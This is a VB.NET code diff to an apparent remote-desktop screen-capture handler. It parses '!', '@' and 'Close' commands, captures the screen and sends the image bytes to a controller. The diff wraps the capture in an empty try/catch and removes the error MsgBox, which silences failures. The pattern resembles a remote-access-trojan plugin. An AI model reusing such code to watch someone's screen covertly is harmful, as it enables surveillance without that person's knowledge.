@@ -98,11 +98,11 @@ cc:
 
     Public Shared bmb = New List(Of Byte())()
     Public Shared cap As New CRDP
+    Public Shared Bb As Byte()
     Public Shared Sub Data(ByVal b As Byte())
         Dim A As String() = Split(BS(b), SPL)
 
         Try
-
             Select Case A(0)
                 Case "!"
                     cap.Clear()
@@ -110,26 +110,29 @@ cc:
                     Send("!" & SPL & s.Width & SPL & s.Height)
 
                 Case "@" ' Start Capture
-                    Dim SizeOfimage As Integer = A(1)
-                    Dim Split As Integer = A(2)
-                    Dim Quality As Integer = A(3)
-                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
-                    Dim MM As New IO.MemoryStream
-                    Dim CMD As String = "@" & SPL
-                    MM.Write(SB(CMD), 0, CMD.Length)
-                    MM.Write(Bb, 0, Bb.Length)
-                    Dim obj As List(Of Byte()) = bmb
-                    SyncLock obj
-                        Send(MM.ToArray)
-                    End SyncLock
-                    MM.Dispose()
+                    Try
+                        Dim SizeOfimage As Integer = A(1)
+                        Dim Split As Integer = A(2)
+                        Dim Quality As Integer = A(3)
+                        Bb = cap.Cap(SizeOfimage, Split, Quality)
+                        Dim MM As New IO.MemoryStream
+                        Dim CMD As String = "@" & SPL
+
+                        MM.Write(SB(CMD), 0, CMD.Length)
+                        MM.Write(Bb, 0, Bb.Length)
+                        Dim obj As List(Of Byte()) = bmb
+                        SyncLock obj
+                            Send(MM.ToArray)
+                        End SyncLock
+                        MM.Dispose()
+                    Catch ex As Exception
+                    End Try
 
                 Case "Close"
                     CloseMe()
             End Select
 
         Catch ex As Exception
-            MsgBox(ex.Message)
         End Try
 
     End Sub
